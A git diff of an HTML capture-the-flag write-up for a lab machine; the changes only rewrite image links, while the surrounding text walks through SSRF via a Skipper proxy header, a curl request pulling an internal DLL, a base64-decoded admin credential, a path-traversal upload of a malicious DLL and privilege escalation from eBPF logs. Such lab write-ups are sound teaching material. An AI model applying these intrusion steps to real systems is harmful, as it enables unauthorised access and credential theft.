@@ -129,14 +129,14 @@ PORT     STATE SERVICE VERSION
 |     Connection: close
 |     Date: Tue, 20 Aug 2024 07:43:41 GMT
 |_    Server: Kestrel</code></pre></div>
-<p><img src="/_resources/ee49b5fdb46846089bca65b35fd5a5f2.png" /></p>
-<p><img src="/_resources/21a66d8a0f324e3e8fc88ce931aae4cc.png" /></p>
+<p><img src=":/ee49b5fdb46846089bca65b35fd5a5f2" alt="8b6040358615f229cdc378b487140038.png" /></p>
+<p><img src=":/21a66d8a0f324e3e8fc88ce931aae4cc" alt="2d008244789cea2cdd4c7baca2fbb421.png" /></p>
 <p>This site seems to loose access to the server and then attempts to reconnect to it 8 times, after user presses “reconnect”.</p>
-<p><img src="/_resources/f4907a5160054cb7b9f66a81ee5db90d.png" /></p>
-<p><img src="/_resources/af100af3a4514290a49c5a22214515b1.png" /></p>
+<p><img src=":/f4907a5160054cb7b9f66a81ee5db90d" alt="1fd1d6995bd0200960429bbc50c114d0.png" /></p>
+<p><img src=":/af100af3a4514290a49c5a22214515b1" alt="81f66f0cbfc72bb727a6fc0273e2a82f.png" /></p>
 <p>we cannot do a GET, but we can do a POST.</p>
-<p><img src="/_resources/856165503d024deba04b8149e61a502b.png" /></p>
-<p><img src="/_resources/90739ed04b9a4721ad2dd858dd0f1c12.png" /></p>
+<p><img src=":/856165503d024deba04b8149e61a502b" alt="bf3f564551f3e5e8477ed4f7f05eb23b.png" /></p>
+<p><img src=":/90739ed04b9a4721ad2dd858dd0f1c12" alt="974b10c56fc04bb825b6b0d06e96136c.png" /></p>
 <p>Using burp to see the requests being sent to the sites, we can always see “blazor”.<br />
 <code>{"protocol":"blazorpack","version":1}</code></p>
 <p><a title="https://en.wikipedia.org/wiki/Blazor" href="https://en.wikipedia.org/wiki/Blazor">https://en.wikipedia.org/wiki/Blazor</a><br />
@@ -249,7 +249,7 @@ Cache-Control: max-age=0</span></code></pre></div>
 But what if the SSRF isn’t due to the web app at all? If the SSRF vulnerability is in the server, well maybe the way to access the SSRF is through the HTTP protocol itself 😃</p>
 </blockquote>
 <p>So I looked back at the nmap scan and realized that I was blind. I got back to the /vacancies submit pannel and got to work.</p>
-<p><img src="/_resources/9b02f95d61ec4aa5944f4c3de374948b.png" /></p>
+<p><img src=":/9b02f95d61ec4aa5944f4c3de374948b" alt="83ed1a2e27f666f4cefb3a9b24c5930b.png" /></p>
 <p>Looking at nmap scan, we can that it is a “80/tcp   open  http    Skipper Proxy”. Looking on it online, we can find. <a title="https://www.exploit-db.com/exploits/51111" href="https://www.exploit-db.com/exploits/51111">https://www.exploit-db.com/exploits/51111</a>. Worth trying for sure.</p>
 <p>Looking at the blazor documentation, it seems that files are in <code>/_framework/</code> directory and it should have some dll files. I looked for dll files that are typicaly in blazor projects and tried to find ports that are open and serving this file on Burp Suite Intruder.</p>
 <div><pre class="hljs"><code><span class="hljs-keyword">GET</span> <span class="hljs-string">/_framework/Microsoft.Extensions.DependencyInjection.dll</span> <span class="hljs-meta">HTTP/1.1</span>
@@ -259,11 +259,11 @@ But what if the SSRF isn’t due to the web app at all? If the SSRF vulnerabilit
 <span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close
 
 </code></pre></div>
-<p><img src="/_resources/b62d0a88faf24d299e92dfd151496ab9.png" /></p>
+<p><img src=":/b62d0a88faf24d299e92dfd151496ab9" alt="f68573c93f2ab86fca072267c6b1d96f.png" /></p>
 <p>I did not know how to progress further, but reading more on the microsoft learn site, I found out that there is a blazor.boot.json file that should list all of the dlls.</p>
-<p><img src="/_resources/517f6566dbe24407aa95fff887998ca9.png" /></p>
+<p><img src=":/517f6566dbe24407aa95fff887998ca9" alt="b385acc01cabfbec9a966625fbe6fb2f.png" /></p>
 <p>It does exist on this server and tells us about InternaLantern.dll file.</p>
-<p><img src="/_resources/9c36ccc5f55e466cacca1d179c9f97c1.png" /></p>
+<p><img src=":/9c36ccc5f55e466cacca1d179c9f97c1" alt="65281ff116572f74a496de99daa76412.png" /></p>
 <p>We can run curl to grab it.</p>
 <div><pre class="hljs"><code>curl -o InternaLantern.dll http://10.129.171.126/_framework/InternaLantern.dll -H "Host: 10.129.171.126" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" -H "X-Skipper-Proxy: http://localhost:5000" -H "Connection: close"</code></pre></div>
 <p>I installed windows VM and downloaded JetBrains DotPeek, so I could analyze this file.<br />
@@ -272,13 +272,13 @@ The first find was in “SqLiteFilename” and we learn that the SQLDB filename 
 Finally, I decided to decode the base64 encoded strings in IntenaLantern &gt; InternaLantern.Pages &gt; Internal.<br />
 Decoding the last base64 <code>U3lzdGVtIGFkbWluaXN0cmF0b3IsIEZpcnN0IGRheTogMjEvMS8yMDI0LCBJbml0aWFsIGNyZWRlbnRpYWxzIGFkbWluOkFKYkZBX1FAOTI1cDlhcCMyMi4gQXNrIHRvIGNoYW5nZSBhZnRlciBmaXJzdCBsb2dpbiE</code> gives us <code>System administrator, First day: 21/1/2024, Initial credentials admin:AJbFA_Q@925p9ap#22. Ask to change after first login!</code></p>
 <p>We are in!</p>
-<p><img src="/_resources/1fba79be39a74195a1065f8091350569.png" /></p>
+<p><img src=":/1fba79be39a74195a1065f8091350569" alt="6ebadb0415eddda90b3252da445e1858.png" /></p>
 <h1 id="admin-panel">Admin panel</h1>
 <p>We got here another upload option, probably our in once again.<br />
 Exploring the website further, choosing module that does not exist it gives us a info, that its executing modules from /opt/components.</p>
-<p><img src="/_resources/9dcec440c191440c9db845967440adac.png" /></p>
+<p><img src=":/9dcec440c191440c9db845967440adac" alt="ef63514bcdb5962ea17f647800a55e71.png" /></p>
 <p>Now we have to try to understand how the upload works.</p>
-<p><img src="/_resources/4835235b0b40483bb397985461448f24.png" /></p>
+<p><img src=":/4835235b0b40483bb397985461448f24" alt="4aab799348af20a0e6592d89a5b6a7c5.png" /></p>
 <p>Its again some blazor fun. This time I found out about a blazor addon for burp, that can be used to decode this gibberish. I created a malicious dll file using chat gpt and prayed that it works, as I never did anything similar to this.</p>
 <div><pre class="hljs"><code><span class="hljs-keyword">using</span> System;
 <span class="hljs-keyword">using</span> System.IO;
@@ -329,9 +329,9 @@ Exploring the website further, choosing module that does not exist it gives us a
 }
 </code></pre></div>
 <p><a title="https://portswigger.net/bappstore/8a87b0d9654944ccbdf6ae8bdd18e1d4" href="https://portswigger.net/bappstore/8a87b0d9654944ccbdf6ae8bdd18e1d4">https://portswigger.net/bappstore/8a87b0d9654944ccbdf6ae8bdd18e1d4</a></p>
-<p><img src="/_resources/2bbd20895f97448482c5e52177e17aca.png" /></p>
+<p><img src=":/2bbd20895f97448482c5e52177e17aca" alt="66ef5be5978fdc68d963e58797296495.png" /></p>
 <p>Changing the file name to do path traversal works, but I had some errors with my DLL file.</p>
-<p><img src="/_resources/08737718de644b97a0f651c31b35be68.png" /></p>
+<p><img src=":/08737718de644b97a0f651c31b35be68" alt="591bc434773300e7a828a37ceb43e9c0.png" /></p>
 <p>At least I knew that it was there. It took me about ~5 minutes to realize that I am a moron and did not compile the file.</p>
 <p>Chat-gpt for the win again:</p>
 <div><pre class="hljs"><code>dotnet new classlib -n MyBlazorComponentLibrary
@@ -339,7 +339,7 @@ Exploring the website further, choosing module that does not exist it gives us a
 dotnet add package Microsoft.AspNetCore.Components
 dotnet add package Microsoft.Extensions.Http
 dotnet build --configuration Release</code></pre></div>
-<p><img src="/_resources/cdbb996e8187401891837af8ce582b10.png" /></p>
+<p><img src=":/cdbb996e8187401891837af8ce582b10" alt="6cb2a6e6ec1208ae6e63687803b65cbc.png" /></p>
 <p>At least we know that there is user thomas now. I tried to create a simple DLL to just get back hello, but still got the same error.</p>
 <div><pre class="hljs"><code>An error occured in <span class="hljs-regexp">/home/</span>tomas<span class="hljs-regexp">/LanternAdmin/</span>bin<span class="hljs-regexp">/Debug/</span>net6.<span class="hljs-number">0</span>/LanternAdmin.dll:
 Can not <span class="hljs-keyword">find</span> a type of <span class="hljs-string">'hi.Component, hi'</span> in <span class="hljs-regexp">/opt/</span>components/hi.dll</code></pre></div>
@@ -363,7 +363,7 @@ Can not <span class="hljs-keyword">find</span> a type of <span class="hljs-strin
 <div><pre class="hljs"><code>An error occured in <span class="hljs-regexp">/home/</span>tomas<span class="hljs-regexp">/LanternAdmin/</span>bin<span class="hljs-regexp">/Debug/</span>net6.<span class="hljs-number">0</span>/LanternAdmin.dll:
 Can not <span class="hljs-keyword">find</span> a type of <span class="hljs-string">'1.Component, 1'</span> in <span class="hljs-regexp">/opt/</span>components/<span class="hljs-number">1</span>.dll</code></pre></div>
 <p>Testing further, I realized that I cannot change the .dll filen name. Also, I started getting new errors.</p>
-<p><img src="/_resources/b0a8d1bf80a24b86a6b5b26162e7e667.png" /></p>
+<p><img src=":/b0a8d1bf80a24b86a6b5b26162e7e667" alt="2e2f8defa7737bd59bfcb7dd01bf6936.png" /></p>
 <p>After more hours of trial and error I somehow got it to work, god knows how. Got ssh for tomas.</p>
 <h1 id="priv-esc">Priv Esc</h1>
 <p>Back to the usual stuff, linenum scan. It gets us:</p>
@@ -391,7 +391,7 @@ ebpf      metadata  stats   </code></pre></div>
 12628|<span class="hljs-string">140492766296199$/usr/lib/x86_64-linux-gnu/libc.so.6!__write</span>|<span class="hljs-string">nano</span>|<span class="hljs-string">nano</span>|<span class="hljs-string">0</span>|<span class="hljs-string">63158069590029</span>|<span class="hljs-string">write</span>|<span class="hljs-string">99446</span>|
 12628|<span class="hljs-string">140492766296199$/usr/lib/x86_64-linux-gnu/libc.so.6!__write</span>|<span class="hljs-string">nano</span>|<span class="hljs-string">nano</span>|<span class="hljs-string">0</span>|<span class="hljs-string">63158069590029</span>|<span class="hljs-string">write</span>|<span class="hljs-string">104356</span>|
 ...</code></pre></div>
-<p><img src="/_resources/53e0dc0fba4c4f71aae60756b6159d6d.png" /></p>
+<p><img src=":/53e0dc0fba4c4f71aae60756b6159d6d" alt="d0a9fd1b14874cd7a913eb036c43cfbc.png" /></p>
 <p>We can see many blobs. Too many and that is a problem.<br />
 I had no idea how to get data from it, I tried converting it to other formats, somehow getting bpftrace on it.<br />
 I was trying to get a query to extract data and after a while and talking to chatgpt I got this:</p>
@@ -400,7 +400,7 @@ I was trying to get a query to extract data and after a while and talking to cha
 <span class="hljs-keyword">FROM</span> ebpf
 <span class="hljs-keyword">WHERE</span> resultcode &gt; <span class="hljs-number">0</span>
 <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-type">timestamp</span>;</code></pre></div>
-<p><img src="/_resources/c5af98a56d4d41d1aef1e0cd124acda4.png" /></p>
+<p><img src=":/c5af98a56d4d41d1aef1e0cd124acda4" alt="d1a99d7decdaf1886dca5324504cdbac.png" /></p>
 <p>I tried converting it from hex to text.</p>
 <div><pre class="hljs"><code>printf "%s" "$(cat hexfile.txt)" | xxd -r -p &gt; binaryfile.bin
 cat binaryfile.bin
@@ -409,7 +409,7 @@ e
 �����┌─[user@parrot]─[~/Desktop]s uuddoo . //bbaacckkuupp..sshh</code></pre></div>
 <p>That’s strange. Maybe I didnt catch everything that I should, so I run procmon again, this time for longer.</p>
 <p>Meanwhile I decided to check in cyberchef if there is anything I can do with it. Running From hex got me:</p>
-<p><img src="/_resources/f0eaa8c14b56491786fcb096abb04705.png" /></p>
+<p><img src=":/f0eaa8c14b56491786fcb096abb04705" alt="b95aca2c0044832a928176187dd877c0.png" /></p>
 <p>I tried it out and the password worked. I dont understand why my previous atempt didnt work, but at last I got the password. Took only ~4 days, good way to start with hard boxes.</p>
 </div>
       </article>
